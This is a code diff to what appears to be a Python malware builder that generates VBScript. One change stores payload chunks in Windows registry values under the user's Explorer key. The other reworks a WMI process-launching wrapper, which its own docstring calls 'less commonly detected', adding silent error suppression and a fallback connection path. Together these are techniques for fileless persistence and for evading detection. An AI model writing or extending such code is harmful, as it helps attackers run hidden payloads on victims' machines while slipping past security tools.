@@ -87,7 +87,7 @@ regPath = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\"
 """
 
         for i, chunk in enumerate(chunks):
-            safe_chunk = chunk.replace("\\", "\\\\").replace('"', '\\"')
+            safe_chunk = chunk.replace('"', '""')
             vbs_code += (
                 f'WshShell.RegWrite regPath & "f{i}", "{safe_chunk}", "REG_SZ"\n'
             )
@@ -109,11 +109,35 @@ Set WshShell = Nothing
     def create_wmi_execution_wrapper(command: str) -> str:
         """Use WMI for process execution - less commonly detected"""
         vbs_code = f"""
-Dim strComputer, objWMI, objProcess, errReturn
+On Error Resume Next
+Dim strComputer, objWMI, objProcess, errReturn, objConfig
 strComputer = "."
+
+' Initialize WMI connection with error handling
 Set objWMI = GetObject("winmgmts:" & strComputer & "root\\cimv2")
+If Err.Number <> 0 Then
+    ' Fallback: Try alternate WMI path
+    Set objWMI = GetObject("winmgmts:root\\cimv2")
+End If
+
 Set objProcess = objWMI.Get("Win32_Process")
-errReturn = objProcess.Create("{command}")
+If Err.Number = 0 Then
+    ' Prepare configuration for process creation
+    Set objConfig = objProcess.Methods_("Create").InParameters.SpawnInstance_()
+    objConfig.CommandLine = "{command}"
+
+    ' Execute via ExecMethod with error handling
+    Dim objOutParams
+    Set objOutParams = objWMI.ExecMethod("Win32_Process", "Create", objConfig)
+
+    If Err.Number = 0 Then
+        errReturn = objOutParams.returnValue
+    Else
+        errReturn = Err.Number
+    End If
+End If
+
+Set objConfig = Nothing
 Set objProcess = Nothing
 Set objWMI = Nothing
 """
